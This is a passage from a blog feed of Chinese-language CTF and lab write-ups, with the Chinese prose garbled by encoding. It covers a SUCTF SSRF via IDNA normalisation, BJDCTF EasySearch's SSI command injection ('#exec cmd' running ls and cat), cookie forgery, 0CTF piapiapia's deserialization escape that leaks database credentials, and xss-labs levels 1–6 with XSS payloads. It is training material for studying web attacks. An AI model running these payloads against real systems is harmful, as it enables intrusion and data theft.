class="string">urlunsplit(parts).split(&#x27;</span> <span class="string">&#x27;)[0]</span></span><br><span class="line"><span class="string">    host = parse.urlparse(finalUrl).hostname</span></span><br><span class="line"><span class="string">    if host == &#x27;</span><span class="string">suctf.cc&#x27;:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">urllib.request.urlopen(finalUrl).read()</span></span><br><span class="line">    <span class="attr">else:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span></span><br><span class="line">    <span class="string">&lt;/code&gt;</span></span><br><span class="line">    <span class="string">&lt;!--</span> <span class="string">Dont</span> <span class="string">worry</span> <span class="string">about</span> <span class="string">the</span> <span class="string">suctf.cc.</span> <span class="string">Go</span> <span class="string">on!</span> <span class="string">--&gt;</span></span><br><span class="line">    <span class="string">&lt;!--</span> <span class="string">Do</span> <span class="string">you</span> <span class="string">know</span> <span class="string">the</span> <span class="string">nginx?</span> <span class="string">--&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡åå‘ç°<code>h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)</code>å¯ä»¥åˆ©ç”¨ï¼Œä½¿ç”¨ä¸‹é¢çš„ä»£ç å¯»æ‰¾å­—æ¯æ›¿ä»£</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_s</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">        real=<span class="built_in">chr</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vm=real.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;xn&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> vm:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;real:&#x27;</span>,real,<span class="string">&#x27;----&gt;&#x27;</span>,vm)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code>å¦‚ä¸‹</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è·å–ä¿¡æ¯</span></span><br><span class="line">/getUrl?url=file://su%E2%93%92tf.cc/usr/local/nginx/conf/nginx.<span class="attribute">conf</span></span><br><span class="line">server &#123; <span class="attribute">listen</span> <span class="number">80</span>; <span class="section">location</span> / &#123; <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>; &#125; <span class="section">location</span> <span class="variable">@app</span> &#123; <span class="attribute">include</span> uwsgi_params; <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock; &#125; <span class="section">location</span> /static &#123; <span class="attribute">alias</span> /app/static; &#125; <span class="comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è·å–flag</span></span><br><span class="line">/getUrl?url=file://su%E2%93%92tf.cc/usr/fffffflag</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>è®¿é—®<code>/index.php.swp</code>è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çˆ†ç ´ä¸€ä¸‹å¯†ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="built_in">str</span>(i).encode()).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i) <span class="comment">#2020666</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç™»é™†ååœ¨å“åº”åŒ…çš„å¤´éƒ¨å‘ç°<code>Url_is_here: public/f4c0fa112d8847a9c7b71f86ff25fa4188144c8a.shtml</code>ï¼Œç»“åˆä»£ç ä¸­<code>&lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;</code>å¯çŸ¥é€šè¿‡æ§åˆ¶<code>username</code>çš„å€¼æ¥ä½¿<code>shtml</code>æ‰§è¡Œ<code>bash</code>å‘½ä»¤</p><blockquote><!--#include file="/home/www/user5616/nav_foot.htm"--> //å¯ä»¥ç”¨æ¥è¯»æ–‡ä»¶<!--#exec cmd="ifconfig"--> //å¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤<!--#include virtual="/includes/header.html" --> //ä¹Ÿæ˜¯è¯»æ–‡ä»¶ ä¸FILEä¸åŒä»–æ”¯æŒç»å¯¹è·¯å¾„å’Œ../æ¥è·³è½¬åˆ°çˆ¶ç›®å½• è€Œfileåªèƒ½è¯»å–å½“å‰ç›®å½•ä¸‹çš„<p><a href="https://www.cnblogs.com/hookjoy/p/3650851.html">Shtmlå¦™ç”¨</a></p></blockquote><p>æœ€ç»ˆ<code>payload</code>å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public</span><br><span class="line">password=2020666&amp;username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span><br><span class="line"></span><br><span class="line">#è®¿é—®å¯¹åº”urlå³å¯è·å¾—flag</span><br><span class="line">password=2020666&amp;username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span><br></pre></td></tr></table></figure><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>ä½¿ç”¨ç»™çš„å¸å·<code>cookie/monster</code>ç™»å½•åä¿®æ”¹<code>Cookie</code>ä¸­çš„<code>username</code>ä¸º<code>admin</code>å³å¯</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>è®¿é—®<code>www.zip</code>è·å¾—æºç ï¼Œå®¡è®¡åå‘ç°<code>config.php</code>ä¸­æœ‰<code>flag</code>ï¼Œé—®é¢˜ä¸»è¦éƒ¨åˆ†æ‘˜å‡ºå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;12345678901&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;123456@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]= <span class="keyword">array</span>(<span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>)))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°<code>nickname</code>åˆ¤å®šä¸å‰ä¸¤ä¸ªä¸åŒï¼Œå¯ä»¥æ§åˆ¶è¾“å…¥ã€‚</p><p>ç”±äº<code>where</code>ä¼šè¢«æ›¿æ¢ä¸º<code>hacker</code>ï¼Œå¤šå‡ºä¸€ä¸ªå­—ç¬¦çš„ç©ºé—´ï¼Œè€Œè¦æ„é€ å‡º<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>éœ€è¦34ä¸ªå­—ç¬¦ï¼ˆä»<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code>ä¸­å¯çŸ¥è¦æ„é€ <code>photo</code>ä¸º<code>config.php</code>ï¼Œå¤šå‡ºçš„<code>&#125;</code>æ˜¯ä¸ºäº†é—­åˆæ•°ç»„ï¼‰ï¼Œæ‰€ä»¥åœ¨<code>nickname</code>æ„é€ å‡º34ä¸ª<code>where</code>å³å¯</p><p>å…¶ä½™å‚æ•°åˆè§„å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>è¯»å–åæŸ¥çœ‹æºç è§£ç å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;qwertyuiop&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;challenges&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;91b2c5f7-d224-4e92-adb5-14f0c5750808&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/104598338">[0CTF 2016]piapiapia(ååºåˆ—åŒ–é€ƒé€¸)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labsåˆ·é¢˜è®°å½•</title>
      <link href="/2022/09/04/xss-labs/"/>
      <url>/2022/09/04/xss-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs-åˆ·é¢˜è®°å½•"><a href="#xss-labs-åˆ·é¢˜è®°å½•" class="headerlink" title="xss-labs åˆ·é¢˜è®°å½•"></a>xss-labs åˆ·é¢˜è®°å½•</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-107459332-blog-122234512.topnsimilarv1&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-107459332-blog-122234512.topnsimilarv1&utm_relevant_index=1">xss-labsé€šå…³å¤§åˆé›†</a></p><p><a href="https://github.com/do0dl3/xss-labs">xss-labs</a></p></blockquote><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;  <span class="comment">//å¯¹ç”¨æˆ·çš„è¾“å…¥ä¸åŠ å¤„ç†ç›´æ¥è¾“å‡º</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&amp;submit=æœç´¢</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>æƒ³åŠæ³•é—­åˆ<code>value</code>å¤„ç„¶åæŠŠåé¢çš„å†…å®¹æ³¨é‡Šæ‰å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level3.php?keyword=&#x27;onfocus=javascript:alert(&#x27;xss&#x27;) &gt; //&amp;submit=æœç´¢</span><br><span class="line">/level3.php?keyword=&#x27;onclick=&#x27;alert(1)&amp;submit=æœç´¢</span><br></pre></td></tr></table></figure><p>éšåç‚¹å‡»ä¸‹å³å¯</p><h3 id="æºç åˆ†æ-2"><a href="#æºç åˆ†æ-2" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p><a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp">PHP htmlspecialchars() å‡½æ•°</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><h3 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level4.php?keyword=&quot;onfocus=javascript:alert(1)//&amp;submit=æœç´¢</span><br><span class="line">/level4.php?keyword=&quot;onclick=&quot;alert(1)&amp;submit=æœç´¢</span><br></pre></td></tr></table></figure><p>éšåç‚¹å‡»ä¸‹å³å¯</p><h3 id="æºç åˆ†æ-3"><a href="#æºç åˆ†æ-3" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><h3 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/level5.php?keyword=&quot;&gt; &lt;a href=javascript:alert(1) &gt; xss&lt;/a&gt; //&amp;submit=æœç´¢</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-4"><a href="#æºç åˆ†æ-4" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><h3 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h3><p>å¤§å°å†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 